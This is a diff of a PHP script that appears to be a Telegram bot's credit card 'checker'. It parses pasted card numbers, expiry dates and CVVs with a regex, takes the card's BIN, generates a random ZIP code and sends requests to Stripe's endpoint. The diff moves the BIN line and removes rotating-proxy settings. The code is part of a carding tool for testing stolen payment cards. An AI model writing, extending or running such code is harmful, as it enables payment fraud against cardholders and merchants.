@@ -41,7 +41,7 @@ if(strpos($message, "/ss ") === 0 || strpos($message, ".ss ") === 0){
 
         $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
         $lista = substr($message, 4);
-        $bin = substr($cc, 0, 6);
+        
         
         if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
             $creditcard = $matches[0][0];
@@ -50,6 +50,7 @@ if(strpos($message, "/ss ") === 0 || strpos($message, ".ss ") === 0){
             $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
             $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
         
+        $bin = substr($cc, 0, 6);
 
             ###CHECKER PART###  
             $zip = rand(10001,90045);
@@ -62,8 +63,6 @@ if(strpos($message, "/ss ") === 0 || strpos($message, ".ss ") === 0){
         
             $ch = curl_init();
             curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
-            curl_setopt($ch, CURLOPT_PROXY, $url[array_rand($url)]);
-            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpass[array_rand($userpass)]);
             curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
             curl_setopt($ch, CURLOPT_HEADER, 0);
             curl_setopt($ch, CURLOPT_HTTPHEADER, array(
